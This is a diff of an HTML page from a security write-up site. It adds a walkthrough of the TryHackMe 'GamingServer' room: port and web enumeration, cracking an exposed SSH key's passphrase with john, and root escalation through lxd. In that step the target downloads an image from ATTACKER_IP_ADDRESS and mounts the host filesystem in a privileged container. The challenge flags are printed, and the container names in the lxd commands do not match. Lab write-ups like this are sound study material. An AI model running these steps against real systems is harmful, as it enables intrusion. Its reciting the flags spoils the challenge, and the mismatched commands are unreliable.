@@ -23,7 +23,7 @@
     
     
       
-        <title>Kiba - Offense, Defense, and Everything Between</title>
+        <title>GamingServer - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#gamingserver" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Kiba
+              GamingServer
             
           </span>
         </div>
@@ -607,6 +612,99 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,9 +719,222 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:brute-force" class="md-tag">brute-force</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:lxd" class="md-tag">lxd</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:web" class="md-tag">web</a>
+      
+    
+  </nav>
 
 
-  <h1>Kiba</h1>
+
+<h1 id="gamingserver">GamingServer</h1>
+<p><img alt="GamingServer logo" src="../logos/gamingserver_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/gamingserver">GamingServer</a>  </p>
+<h2 id="description">Description</h2>
+<p>"An Easy Boot2Root box for beginners
+Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system."</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: House of danak
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>No <code>sitemap</code> file  </li>
+<li>Comment in source code: "john, please add some actual content to the site! lorem ipsum is horrible to look at."<br />
+<em>"john" - possible username?</em>  </li>
+<li>Web page has links to <code>about.html</code> and <code>myths.html</code>: nothing interesting in source code for either  </li>
+<li><code>robots.txt</code> has an entry for <code>/uploads</code>  </li>
+<li><code>ffuf</code> scan reveals a <code>/secret</code> directory: hosts an RSA private key  </li>
+<li><code>/uploads</code> directory contains dictionary file, a copy of the Hacker Manifesto, and a .jpg file</li>
+</ul>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Save contents of key found on <code>/secret</code> endpoint<br />
+<em>Saved as <code>id_rsa</code></em><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Download dictionary list from <code>/uploads</code> directory with <code>curl</code><br />
+<em>Saved as <code>dict.lst</code></em><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Download .jpg file with <code>curl</code><br />
+<em>Saved as <code>meme.jpg</code></em>  </p>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 7.6p1  # Only result: username enumeration
+searchsploit httpd 2.4.29   # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<div class="highlight"><pre><span></span><code>ssh2john id_rsa &gt; key.hash
+john key.hash --wordlist=dict.lst       # Password cracked as &quot;letmein&quot;
+chmod 600 id_rsa
+ssh john@TARGET_IP_ADDRESS -i id_rsa    # Login successful
+john@exploitable:~$ ls -al
+total 60
+drwxr-xr-x 8 john john  4096 Jul 27  2020 .
+drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
+lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
+drwx------ 2 john john  4096 Feb  5  2020 .cache
+drwxr-x--- 3 john john  4096 Jul 27  2020 .config
+drwx------ 3 john john  4096 Feb  5  2020 .gnupg
+drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
+-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
+drwx------ 2 john john  4096 Feb  5  2020 .ssh
+-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
+-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
+drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
+-rw------- 1 root root 12070 Jul 27  2020 .viminfo
+john@exploitable:~$ cat user.txt
+</code></pre></div>
+<details class="success">
+<summary>What is the user flag?</summary>
+<p>a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre><span></span><code>john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+</code></pre></div>
+<p><a href="https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html">lxd/lxc Group - Privilege escalation</a></p>
+<div class="highlight"><pre><span></span><code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+cd lxd-alpine-builder
+sudo python3 -m http.server
+
+john@exploitable:~$ wget http://ATTACKER_IP_ADDRESS:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+john@exploitable:~$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
+john@exploitable:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+john@exploitable:~$ lxc start mycontainer
+john@exploitable:~$ lxc exec mycontainer /bin/sh
+
+~ # ls -al /mnt/root
+total 2091108
+drwxr-xr-x   24 root     root          4096 Feb  5  2020 .
+drwxr-xr-x    1 root     root             8 Apr 25 20:58 ..
+drwxr-xr-x    2 root     root          4096 Feb  5  2020 bin
+drwxr-xr-x    3 root     root          4096 Feb  5  2020 boot
+drwxr-xr-x    2 root     root          4096 Feb  5  2020 cdrom
+drwxr-xr-x   15 root     root          3720 Apr 25 19:25 dev
+drwxr-xr-x   93 root     root          4096 Jul 27  2020 etc
+drwxr-xr-x    3 root     root          4096 Feb  5  2020 home
+lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img -&gt; boot/initrd.img-4.15.0-76-generic
+lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img.old -&gt; boot/initrd.img-4.15.0-76-generic
+drwxr-xr-x   22 root     root          4096 Feb  5  2020 lib
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 lib64
+drwx------    2 root     root         16384 Feb  5  2020 lost+found
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 media
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 opt
+dr-xr-xr-x  162 root     root             0 Apr 25 19:25 proc
+drwx------    3 root     root          4096 Feb  5  2020 root
+drwxr-xr-x   27 root     root           920 Apr 25 20:56 run
+drwxr-xr-x    2 root     root         12288 Feb  5  2020 sbin
+drwxr-xr-x    4 root     root          4096 Feb  5  2020 snap
+drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
+-rw-------    1 root     root     2141192192 Feb  5  2020 swap.img
+dr-xr-xr-x   13 root     root             0 Apr 25 20:02 sys
+drwxrwxrwt   11 root     root          4096 Apr 25 20:39 tmp
+drwxr-xr-x   10 root     root          4096 Aug  5  2019 usr
+drwxr-xr-x   14 root     root          4096 Feb  5  2020 var
+lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz -&gt; boot/vmlinuz-4.15.0-76-generic
+lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-76-generic
+~ # ls -al /mnt/root/root
+total 32
+drwx------    3 root     root          4096 Feb  5  2020 .
+drwxr-xr-x   24 root     root          4096 Feb  5  2020 ..
+-rw-------    1 root     root            42 Feb  5  2020 .bash_history
+-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+drwx------    2 root     root          4096 Feb  5  2020 .ssh
+-rw-------    1 root     root          1090 Feb  5  2020 .viminfo
+-rw-r--r--    1 root     root            33 Feb  5  2020 root.txt
+~ # cat /mnt/root/root/root.txt
+</code></pre></div>
+<details class="success">
+<summary>What is the root flag?</summary>
+<p>2e337b8c9f3aff0c2b3e8d4e6a7c88fc</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>john</code> <code>lxc</code></p>
+<p><strong>Date completed:</strong> 25/04/26<br />
+<strong>Date published:</strong> 25/04/26</p>
 
 
 
@@ -631,7 +942,8 @@
 
 
 
-
+  
+  
 
 
 
